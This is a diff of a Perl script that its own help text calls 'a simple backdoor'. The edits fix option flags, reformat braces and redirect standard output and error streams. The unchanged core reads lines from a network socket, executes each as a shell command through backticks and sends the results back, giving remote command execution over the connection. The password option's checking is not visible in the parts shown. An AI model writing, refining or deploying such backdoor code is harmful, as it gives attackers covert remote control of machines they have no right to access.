@@ -12,7 +12,7 @@ my $helpText = "
 Description : This is a simple backdoor
 
 Usage : \n
---password | -u\t: password to use
+--password | -p\t: password to use
 --port     |   \t: port to use (default port of protocol)
 --help     | -h\t: print this help
 --verbose  | -v\t: print more verbose
@@ -42,7 +42,7 @@ my $soc;
 
 GetOptions(
     'password|p=s' => \$password,    # string
-    'port=i'       => \$port,        # string
+    'port=i'       => \$port,        # int
     'version'      => \$version,     # flag
     'verbose|v'    => \$verbose,     # flag
     'help|h|?'     => \$help,        # flag
@@ -50,7 +50,6 @@ GetOptions(
 
 sub main()
 {
-    $| = 1;
     if ( defined $help )
     {
         print($helpText);
@@ -79,31 +78,37 @@ sub main()
         }
         my $res;
         my $err;
+        close(STDERR);
+        close(STDOUT);
+        local *STDOUT;
+        local *STDERR;
+        open( STDOUT, ">>", $err );
+        open( STDERR, ">>", $err );
         while (1)
         {
-            open($err,<STDERR>);
             while ( my $rec = <$tmpSoc> )
             {
                 chomp($rec);
-                if(defined $verbose)
+                if ( defined $verbose )
                 {
                     print("Rec : '$rec'\n");
                 }
                 $res = `$rec`;
-                if($res eq "")
+                if ( $res eq "" )
                 {
                     $res = "$err\n";
                 }
-                if(defined $verbose)
+                if ( defined $verbose )
                 {
                     print("Data : $res\n");
                 }
-                $tmpSoc->send($res . "{}\n");
+                $tmpSoc->send( $res . "{}\n" );
             }
 
         }
         $soc->close();
-    }else
+    }
+    else
     {
         print($helpText);
     }
